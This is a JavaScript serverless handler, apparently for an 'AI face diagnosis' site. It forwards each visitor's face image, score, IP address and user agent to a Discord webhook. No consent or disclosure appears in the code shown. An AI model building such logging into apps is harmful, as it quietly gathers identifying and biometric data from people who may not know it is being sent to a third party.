export const handler = async (event) => {
  try {
    const webhook = process.env.DISCORD_WEBHOOK;
    if (!webhook) {
      return { statusCode: 200, body: "no webhook" };
    }

    const { score, rank, image } = JSON.parse(event.body || "{}");

    // IP / UA
    const ip =
      event.headers["x-forwarded-for"]?.split(",")[0] || "unknown";
    const ua = event.headers["user-agent"] || "unknown";

    const time = new Date().toLocaleString("ja-JP", {
      timeZone: "Asia/Tokyo"
    });

    // base64 → Blob
    const base64Data = image.split(",")[1];
    const buffer = Buffer.from(base64Data, "base64");

    // multipart/form-data を自前で作る
    const boundary = "----discordboundary";
    const payload =
      `--${boundary}\r\n` +
      `Content-Disposition: form-data; name="payload_json"\r\n\r\n` +
      JSON.stringify({
        username: "AI 顔診断ログ",
        embeds: [{
          title: "📸 顔診断結果",
          color: 0x6366f1,
          fields: [
            {
              name: "診断",
              value: `黄金比：${score}%\nランク：${rank}`
            },
            {
              name: "アクセス情報",
              value: `IP：${ip}\nUA：${ua}`
            }
          ],
          image: { url: "attachment://face.png" },
          footer: { text: time }
        }]
      }) +
      `\r\n--${boundary}\r\n` +
      `Content-Disposition: form-data; name="file"; filename="face.png"\r\n` +
      `Content-Type: image/png\r\n\r\n`;

    const end = `\r\n--${boundary}--`;

    const bodyBuffer = Buffer.concat([
      Buffer.from(payload, "utf-8"),
      buffer,
      Buffer.from(end, "utf-8")
    ]);

    await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": `multipart/form-data; boundary=${boundary}`
      },
      body: bodyBuffer
    });

    return { statusCode: 200, body: "sent" };
  } catch (e) {
    return { statusCode: 200, body: "error" };
  }
};
